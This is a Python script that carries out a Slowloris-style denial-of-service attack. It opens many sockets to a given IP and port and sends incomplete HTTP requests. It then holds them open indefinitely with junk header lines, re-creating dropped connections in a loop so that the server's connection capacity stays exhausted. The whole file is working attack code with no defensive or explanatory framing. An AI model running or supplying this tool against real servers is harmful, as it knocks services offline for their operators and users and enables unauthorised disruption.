#!/bin/python3

import sys
import socket
import random
import time
from tqdm import tqdm

header_lst = [
		"User-agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
		"Accept-language: en-US,en,q=0.5"
]

usage = "Usage: {} <ip-address> <port> <socket-count> <timer>"

# function to initiate a socket (create a connection)
def init_socket(ip, port):
	ret = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	ret.settimeout(4)
	ret.connect((ip, int(port)))
	ret.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode('UTF-8'))
	for header in header_lst:
		ret.send("{}\r\n".format(header).encode('UTF-8'))
	return ret

def main():
	if len(sys.argv) < 5:
		print (usage.format(sys.argv[0]))
		return
	ip = sys.argv[1]
	port = sys.argv[2]
	socket_count = int(sys.argv[3])
	timer = int(sys.argv[4])
	socket_list=[]

	# initiate all the connection
	for _ in tqdm(range(0, socket_count), total = socket_count, desc ="connecting sockets"):
		try:
			s = init_socket(ip, port)
		except socket.error:
			break
		socket_list.append(s)

	if (0 == len(socket_list)):
		print ("The connection with the target failed")
		return

	# keep all connection alive by sending gliberish
	while True:
		print ("\nSending keep-alive headers [socket_list size={}]".format(len(socket_list)))
		for elem in socket_list:
			try:
				elem.send("X-a {}\r\n".format(random.randint(1, 5000)).encode('UTF-8'))
			except socket.error:
				socket_list.remove(elem)

		# recreate the lost sockets
		to_rebuild = socket_count - len(socket_list)
		print ("socket connection: {}".format(len(socket_list)))

		if (0 == len(socket_list)):
			print ("Connection lost...")
			return

		if (to_rebuild > 0):
			for _ in tqdm(range(0, to_rebuild), total = to_rebuild, desc ="Re-creating {} socket".format(to_rebuild)):
				try:
					new_socket = init_socket(ip, port)
					if new_socket:
						socket_list.append(new_socket)
				except socket.error:
					break

		# time before next send
		time.sleep(timer)

if __name__=="__main__":
	main()
else:
	print("file called [__main__ = %s]" %__name__)
